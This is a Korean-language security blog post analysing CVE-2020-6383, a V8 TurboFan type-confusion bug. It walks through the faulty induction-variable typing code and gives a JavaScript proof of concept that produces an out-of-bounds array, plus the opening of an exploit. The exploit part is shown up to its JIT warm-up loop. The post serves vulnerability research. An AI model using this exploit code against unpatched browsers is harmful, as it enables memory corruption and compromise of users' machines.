<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
  

  <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>v8 1 day CVE-2020-6383 | Core-Research-Team</title>
<meta name="generator" content="Jekyll v4.0.1" />
<meta property="og:title" content="v8 1 day CVE-2020-6383" />
<meta name="author" content="wwwlk" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="라온화이트햇 핵심연구팀 조진호" />
<meta property="og:description" content="라온화이트햇 핵심연구팀 조진호" />
<link rel="canonical" href="http://localhost:4000/2020-06-01/v8-1-day-CVE-2020-6383" />
<meta property="og:url" content="http://localhost:4000/2020-06-01/v8-1-day-CVE-2020-6383" />
<meta property="og:site_name" content="Core-Research-Team" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-06-01T00:00:00+00:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"v8 1 day CVE-2020-6383","dateModified":"2020-06-01T00:00:00+00:00","datePublished":"2020-06-01T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020-06-01/v8-1-day-CVE-2020-6383"},"author":{"@type":"Person","name":"wwwlk"},"url":"http://localhost:4000/2020-06-01/v8-1-day-CVE-2020-6383","description":"라온화이트햇 핵심연구팀 조진호","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">

  <!-- Favicon -->
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">

  <!-- RSS -->
  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Core-Research-Team" />

  <!-- Google Analytics-->
  
 
</head>


  <body>

    <nav class="nav">
  <div class="nav-container">
    <a href="/">
      <h2 class="nav-title">RAON - Core Research Team</h2>
    </a>
    <ul>
      <li><a href="/about">About</a></li>
      <li><a href="/">Posts</a></li>
    </ul>
  </div>
</nav>


    <main>
      <div class="post"> 
	<h1 class="post-title">v8 1 day CVE-2020-6383</h1>
	<div class="post-line"></div>

	
		
			
				<span class="tag"><center><i>pwnable</i></center></span>
			
		
			
				<span class="tag"><center><i>CVE</i></center></span>
			
		
	

	<p>라온화이트햇 핵심연구팀 조진호</p>

<h2 id="summary">summary</h2>

<p>turbofan 코드에서 v8 type confusion</p>

<p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">1051017 - chromium - An open-source project to help move the web forward. - Monorail</a></p>

<h2 id="issue-1051017-type-inference-issue">issue 1051017: Type inference issue</h2>

<p>TurboFan optimize bug</p>

<h2 id="vulnerability-details">Vulnerability details</h2>

<p><a href="https://cs.chromium.org/chromium/src/v8/src/compiler/typer.cc?rcl=25c49d2bd6cbdc72b0779545d2a32406657befda&amp;l=845">https://cs.chromium.org/chromium/src/v8/src/compiler/typer.cc?rcl=25c49d2bd6cbdc72b0779545d2a32406657befda&amp;l=845</a></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Type</span> <span class="n">Typer</span><span class="o">::</span><span class="n">Visitor</span><span class="o">::</span><span class="n">TypeInductionVariablePhi</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
<span class="p">[...]</span>
  <span class="k">const</span> <span class="kt">bool</span> <span class="n">both_types_integer</span> <span class="o">=</span> <span class="n">initial_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
                                  <span class="n">increment_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">);</span>
  <span class="kt">bool</span> <span class="n">maybe_nan</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
  <span class="c1">// The addition or subtraction could still produce a NaN, if the integer</span>
  <span class="c1">// ranges touch infinity.</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">both_types_integer</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">Type</span> <span class="n">resultant_type</span> <span class="o">=</span>
        <span class="p">(</span><span class="n">arithmetic_type</span> <span class="o">==</span> <span class="n">InductionVariable</span><span class="o">::</span><span class="n">ArithmeticType</span><span class="o">::</span><span class="n">kAddition</span><span class="p">)</span>
            <span class="o">?</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">operation_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NumberAdd</span><span class="p">(</span><span class="n">initial_type</span><span class="p">,</span> <span class="n">increment_type</span><span class="p">)</span>
            <span class="o">:</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">operation_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NumberSubtract</span><span class="p">(</span><span class="n">initial_type</span><span class="p">,</span>
                                                        <span class="n">increment_type</span><span class="p">);</span>
    <span class="n">maybe_nan</span> <span class="o">=</span> <span class="n">resultant_type</span><span class="p">.</span><span class="n">Maybe</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">NaN</span><span class="p">());</span> <span class="c1">// *** 1 ***</span>
  <span class="p">}</span>

<span class="p">[...]</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">arithmetic_type</span> <span class="o">==</span> <span class="n">InductionVariable</span><span class="o">::</span><span class="n">ArithmeticType</span><span class="o">::</span><span class="n">kAddition</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">increment_min</span> <span class="o">=</span> <span class="n">increment_type</span><span class="p">.</span><span class="n">Min</span><span class="p">();</span>
    <span class="n">increment_max</span> <span class="o">=</span> <span class="n">increment_type</span><span class="p">.</span><span class="n">Max</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="n">InductionVariable</span><span class="o">::</span><span class="n">ArithmeticType</span><span class="o">::</span><span class="n">kSubtraction</span><span class="p">,</span> <span class="n">arithmetic_type</span><span class="p">);</span>
    <span class="n">increment_min</span> <span class="o">=</span> <span class="o">-</span><span class="n">increment_type</span><span class="p">.</span><span class="n">Max</span><span class="p">();</span>
    <span class="n">increment_max</span> <span class="o">=</span> <span class="o">-</span><span class="n">increment_type</span><span class="p">.</span><span class="n">Min</span><span class="p">();</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">increment_min</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="p">[...]</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">increment_max</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="p">[...]</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="c1">// Shortcut: If the increment can be both positive and negative,</span>
    <span class="c1">// the variable can go arbitrarily far, so just return integer.</span>
    <span class="k">return</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">;</span> <span class="c1">// *** 2 ***</span>
  <span class="p">}</span>
</code></pre></div></div>

<p>취약점 발생 클래스는 <code class="highlighter-rouge">Typer::Visitor::TypeInductionVariablePhi</code>이고 해당 코드는 루프 관련해서 최적화를 진행하다가 발생한다. 반복문들 도는 경우 <code class="highlighter-rouge">for (let i = start; i &lt; end; i+=inc)</code>와 같은 코드가 있다면 <code class="highlighter-rouge">inc</code>의 부호와 <code class="highlighter-rouge">start</code>를 보고 도는 반복문의 <code class="highlighter-rouge">i</code>의 범위를 지정해주는 코드이다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">const</span> <span class="n">bool</span> <span class="n">both_types_integer</span> <span class="o">=</span> <span class="n">initial_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
                                  <span class="n">increment_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">);</span>
</code></pre></div></div>

<p>먼저 여기서 <code class="highlighter-rouge">both_types_integer</code>를 <code class="highlighter-rouge">true</code>로 세팅한다. <code class="highlighter-rouge">start</code>와 <code class="highlighter-rouge">inc</code>를 숫자로 <code class="highlighter-rouge">kInterger</code>로 설정한다.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// The addition or subtraction could still produce a NaN, if the integer</span>
<span class="c1">// ranges touch infinity.</span>
<span class="k">if</span> <span class="p">(</span><span class="n">both_types_integer</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Type</span> <span class="n">resultant_type</span> <span class="o">=</span>
      <span class="p">(</span><span class="n">arithmetic_type</span> <span class="o">==</span> <span class="n">InductionVariable</span><span class="o">::</span><span class="n">ArithmeticType</span><span class="o">::</span><span class="n">kAddition</span><span class="p">)</span>
          <span class="o">?</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">operation_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NumberAdd</span><span class="p">(</span><span class="n">initial_type</span><span class="p">,</span> <span class="n">increment_type</span><span class="p">)</span>
          <span class="o">:</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">operation_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NumberSubtract</span><span class="p">(</span><span class="n">initial_type</span><span class="p">,</span>
                                                      <span class="n">increment_type</span><span class="p">);</span>
  <span class="n">maybe_nan</span> <span class="o">=</span> <span class="n">resultant_type</span><span class="p">.</span><span class="n">Maybe</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">NaN</span><span class="p">());</span>
<span class="p">}</span>
</code></pre></div></div>

<p>만약 설정이 되어있다면 결과의 형식을 판단하는데 이 코드에서는 <code class="highlighter-rouge">inf</code>가 있으면 <code class="highlighter-rouge">NaN</code>이 나올 수 있으니 검사한다고 적혀 있다. <code class="highlighter-rouge">-inf</code> + <code class="highlighter-rouge">inf</code>가 <code class="highlighter-rouge">NaN</code>이 나오는데 이런 경우이다.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// We only handle integer induction variables (otherwise ranges</span>
<span class="c1">// do not apply and we cannot do anything).</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">both_types_integer</span> <span class="o">||</span> <span class="n">maybe_nan</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// Fallback to normal phi typing, but ensure monotonicity.</span>
  <span class="c1">// (Unfortunately, without baking in the previous type, monotonicity might</span>
  <span class="c1">// be violated because we might not yet have retyped the incrementing</span>
  <span class="c1">// operation even though the increment's type might been already reflected</span>
  <span class="c1">// in the induction variable phi.)</span>
  <span class="n">Type</span> <span class="n">type</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">IsTyped</span><span class="p">(</span><span class="n">node</span><span class="p">)</span> <span class="o">?</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetType</span><span class="p">(</span><span class="n">node</span><span class="p">)</span>
                                            <span class="o">:</span> <span class="n">Type</span><span class="o">::</span><span class="n">None</span><span class="p">();</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">arity</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">type</span> <span class="o">=</span> <span class="n">Type</span><span class="o">::</span><span class="n">Union</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">Operand</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">i</span><span class="p">),</span> <span class="n">zone</span><span class="p">());</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">type</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>그리고 만약 <code class="highlighter-rouge">NaN</code>이 나오거나, 두 숫자가 <code class="highlighter-rouge">kInteger</code>가 아닌 경우 range를 지정할 수 없다고 판단하여 들 어온 파라미터의 형식을 모두 넣어주고 타입을 되돌려준다.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">increment_min</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">[...]</span>
    <span class="n">max</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">min</span><span class="p">(</span><span class="n">max</span><span class="p">,</span> <span class="n">bound_max</span> <span class="o">+</span> <span class="n">increment_max</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">max</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">max</span><span class="p">(</span><span class="n">max</span><span class="p">,</span> <span class="n">initial_type</span><span class="p">.</span><span class="n">Max</span><span class="p">());</span>
<span class="err">}</span> <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">increment_max</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	  <span class="p">[...]</span>
    <span class="n">min</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">max</span><span class="p">(</span><span class="n">min</span><span class="p">,</span> <span class="n">bound_min</span> <span class="o">+</span> <span class="n">increment_min</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">min</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">min</span><span class="p">(</span><span class="n">min</span><span class="p">,</span> <span class="n">initial_type</span><span class="p">.</span><span class="n">Min</span><span class="p">());</span>
<span class="err">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="c1">// Shortcut: If the increment can be both positive and negative,</span>
  <span class="c1">// the variable can go arbitrarily far, so just return integer.</span>
  <span class="k">return</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">[...]</span>

<span class="k">return</span> <span class="n">Type</span><span class="o">::</span><span class="n">Range</span><span class="p">(</span><span class="n">min</span><span class="p">,</span> <span class="n">max</span><span class="p">,</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">zone</span><span class="p">());</span>
</code></pre></div></div>

<p>그리고 <code class="highlighter-rouge">inc</code>의 부호에 따라 <code class="highlighter-rouge">range</code>를 만들고 리턴하는데 부호가 양수<code class="highlighter-rouge">([0, inf])</code>나 음수<code class="highlighter-rouge">([-inf, 0])</code>가 아닌 경우에는 그냥 <code class="highlighter-rouge">kInteger</code>를 리턴한다. <code class="highlighter-rouge">kInteger</code>는 <code class="highlighter-rouge">[-V8_INFINITY, V8_INFINITY]</code>의 범위를 가진다.</p>

<p>지금까지 코드를 보면, <code class="highlighter-rouge">kInteger</code>타입으로 리턴을 하게 하려면 <code class="highlighter-rouge">kInteger</code>타입의 <code class="highlighter-rouge">start</code>와 <code class="highlighter-rouge">inc</code>가 있어야 하며 <code class="highlighter-rouge">inc</code>의 부호가 음수와 양수를 가져야한다는 것을 알 수 있다. 그러면서 <code class="highlighter-rouge">start</code>와 <code class="highlighter-rouge">inc</code>를 더했을 때 <code class="highlighter-rouge">NaN</code>이 나오게 해야 한다.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">both_types_integer</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Type</span> <span class="n">resultant_type</span> <span class="o">=</span>
      <span class="p">(</span><span class="n">arithmetic_type</span> <span class="o">==</span> <span class="n">InductionVariable</span><span class="o">::</span><span class="n">ArithmeticType</span><span class="o">::</span><span class="n">kAddition</span><span class="p">)</span>
          <span class="o">?</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">operation_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NumberAdd</span><span class="p">(</span><span class="n">initial_type</span><span class="p">,</span> <span class="n">increment_type</span><span class="p">)</span>
          <span class="o">:</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">operation_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NumberSubtract</span><span class="p">(</span><span class="n">initial_type</span><span class="p">,</span>
                                                      <span class="n">increment_type</span><span class="p">);</span>
  <span class="n">maybe_nan</span> <span class="o">=</span> <span class="n">resultant_type</span><span class="p">.</span><span class="n">Maybe</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">NaN</span><span class="p">());</span>
<span class="p">}</span>
</code></pre></div></div>

<p>이 코드를 보면 한번만 연산하여 <code class="highlighter-rouge">NaN</code>인지 판단한다. 하지만 반복문 내에서 inc값이 바뀐다면 이 코드를 우회하여 <code class="highlighter-rouge">NaN</code>을 만들 수 있다.</p>

<h2 id="poc">PoC</h2>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">function</span> <span class="nf">trigger</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">var</span> <span class="n">x</span> <span class="o">=</span> <span class="o">-</span><span class="n">Infinity</span><span class="p">;</span>
  <span class="n">var</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">var</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="o">-</span><span class="n">Infinity</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">x</span> <span class="o">=</span> <span class="o">+</span><span class="n">Infinity</span><span class="p">;</span>
      <span class="p">}</span>

      <span class="k">if</span> <span class="p">(</span><span class="o">++</span><span class="n">k</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>
  <span class="p">}</span>

  <span class="n">var</span> <span class="n">value</span> <span class="o">=</span> <span class="n">Math</span><span class="p">.</span><span class="n">max</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
  <span class="n">value</span> <span class="o">=</span> <span class="o">-</span><span class="n">value</span><span class="p">;</span>
  <span class="n">value</span> <span class="o">=</span> <span class="n">Math</span><span class="p">.</span><span class="n">max</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span>
  <span class="n">value</span> <span class="o">=</span> <span class="o">-</span><span class="n">value</span><span class="p">;</span>
  <span class="n">value</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>
  <span class="n">value</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// *** 3 ***</span>
  <span class="n">value</span> <span class="o">+=</span> <span class="mi">10</span><span class="p">;</span> <span class="c1">//</span>

  <span class="n">var</span> <span class="n">array</span> <span class="o">=</span> <span class="n">Array</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
  <span class="n">array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
  <span class="k">return</span> <span class="p">[</span><span class="n">array</span><span class="p">,</span> <span class="p">{}];</span>
<span class="p">};</span>

<span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">20000</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">trigger</span><span class="p">();</span>
<span class="p">}</span>

<span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="n">trigger</span><span class="p">()[</span><span class="mi">0</span><span class="p">][</span><span class="mi">11</span><span class="p">]);</span>
</code></pre></div></div>

<p>oob가 가능한 코드이다. <code class="highlighter-rouge">i</code>에 실제 값은 <code class="highlighter-rouge">NaN</code>인데 <code class="highlighter-rouge">kInteger</code>타입으로 되어있다. 실제 oob 타입을 만드는 변수는 아래 연산으로 만들어진다.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">var</span> <span class="n">value</span> <span class="o">=</span> <span class="n">Math</span><span class="p">.</span><span class="n">max</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>  <span class="c1">// [0x100, inf]</span>
<span class="n">value</span> <span class="o">=</span> <span class="o">-</span><span class="n">value</span><span class="p">;</span>                  <span class="c1">// [-inf, -0x100]</span>
<span class="n">value</span> <span class="o">=</span> <span class="n">Math</span><span class="p">.</span><span class="n">max</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x101</span><span class="p">);</span> <span class="c1">// [-0x101, -0x100]</span>
<span class="n">value</span> <span class="o">=</span> <span class="o">-</span><span class="n">value</span><span class="p">;</span>                  <span class="c1">// [0x100, 0x101]</span>
<span class="n">value</span> <span class="o">-=</span> <span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>                <span class="c1">// [0x2, 0x3]</span>

<span class="n">value</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>                     <span class="c1">// NaN &gt;&gt; 1 = 0</span>
<span class="n">value</span> <span class="o">+=</span> <span class="mi">10</span><span class="p">;</span>                     <span class="c1">// 0 + 10</span>
</code></pre></div></div>

<p>변수 range의 범위를 조정하여 3번째 줄에서 무조건 <code class="highlighter-rouge">value</code>를 선택하게 만들어 실제 range와 값을 다르게 만들었다. JIT이 적용되지 않은 경우에는 <code class="highlighter-rouge">NaN</code>으로 모두 <code class="highlighter-rouge">NaN</code>이 나오다가 밑에서 <code class="highlighter-rouge">value &gt;&gt;= 1</code> 에서 0으로 세팅된다. JIT이 적용되면 <code class="highlighter-rouge">NaN</code>(0)인 값을 가진채로 <code class="highlighter-rouge">value -= 0x100</code>을 하게 되어 음수가 되는데 <code class="highlighter-rouge">range</code>는 <code class="highlighter-rouge">[2, 3]</code>이라서 Array를 생성할 때 체크를 우회하게 된다.</p>

<h1 id="exploit">exploit</h1>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">conversion_buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">float_view</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">conversion_buffer</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">int_view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">conversion_buffer</span><span class="p">);</span>
<span class="nx">BigInt</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">hex</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="dl">'</span><span class="s1">0x</span><span class="dl">'</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
<span class="p">};</span>
<span class="nx">BigInt</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">i2f</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">int_view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">float_view</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>
<span class="nx">BigInt</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">smi2f</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">int_view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="k">this</span> <span class="p">&lt;</span><span class="err">&lt;</span> <span class="err">32</span><span class="nt">n</span><span class="err">;</span>
    <span class="nt">return</span> <span class="nt">float_view</span><span class="err">[0];</span>
<span class="err">}</span>
<span class="nc">Number</span><span class="p">.</span><span class="nt">prototype</span><span class="p">.</span><span class="nt">f2i</span> <span class="err">=</span> <span class="nt">function</span><span class="err">()</span> <span class="err">{</span>
    <span class="nt">float_view</span><span class="err">[0]</span> <span class="err">=</span> <span class="nt">this</span><span class="err">;</span>
    <span class="nt">return</span> <span class="nt">int_view</span><span class="err">[0];</span>
<span class="err">}</span>
<span class="nc">Number</span><span class="p">.</span><span class="nt">prototype</span><span class="p">.</span><span class="nt">f2smi</span> <span class="err">=</span> <span class="nt">function</span><span class="err">()</span> <span class="err">{</span>
    <span class="nt">float_view</span><span class="err">[0]</span> <span class="err">=</span> <span class="nt">this</span><span class="err">;</span>
    <span class="nt">return</span> <span class="nt">int_view</span><span class="err">[0]</span> <span class="p">&gt;</span><span class="err">&gt;</span> 32n;
}
Number.prototype.i2f = function() <span class="si">{</span>
    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">i2f</span><span class="p">();</span>
<span class="si">}</span>
Number.prototype.smi2f = function() <span class="si">{</span>
    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">smi2f</span><span class="p">();</span>
<span class="si">}</span>

var yee2;
function trigger() <span class="si">{</span>
    <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span> <span class="c1">// [0x100, inf]</span>
    <span class="nx">value</span> <span class="o">=</span> <span class="o">-</span><span class="nx">value</span><span class="p">;</span> <span class="c1">// [-inf, -0x100]</span>
    <span class="nx">value</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x101</span><span class="p">);</span>    <span class="c1">// [-0x101, -0x100]</span>
    <span class="nx">value</span> <span class="o">=</span> <span class="o">-</span><span class="nx">value</span><span class="p">;</span> <span class="c1">// [0x100, 0x101]</span>
    <span class="nx">value</span> <span class="o">-=</span> <span class="p">(</span><span class="mh">0x100</span><span class="p">);</span> <span class="c1">// [0x2, 0x3]</span>

    <span class="nx">value</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="nx">value</span> <span class="o">+=</span> <span class="mi">10</span><span class="p">;</span>

    <span class="kd">var</span> <span class="nx">array</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
    <span class="nx">array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
    <span class="nx">arr2</span> <span class="o">=</span> <span class="p">[{},</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">];</span>
    <span class="c1">// yee2 = arr2;</span>
    <span class="c1">// var b = [2.2, 2.2, 2.2, 2.2, 2.2];</span>
    <span class="nx">yee2</span> <span class="o">=</span> <span class="nx">arr2</span><span class="p">;</span>
    <span class="k">return</span> <span class="p">[</span><span class="nx">array</span><span class="p">,</span> <span class="p">{}];</span>
<span class="si">}</span>;

trigger();

for (let i = 0; i <span class="p">&lt;</span> <span class="err">100000;</span> <span class="err">++</span><span class="nt">i</span><span class="err">)</span> <span class="err">{</span>
    <span class="nt">trigger</span><span class="err">();</span>
<span class="err">}</span>

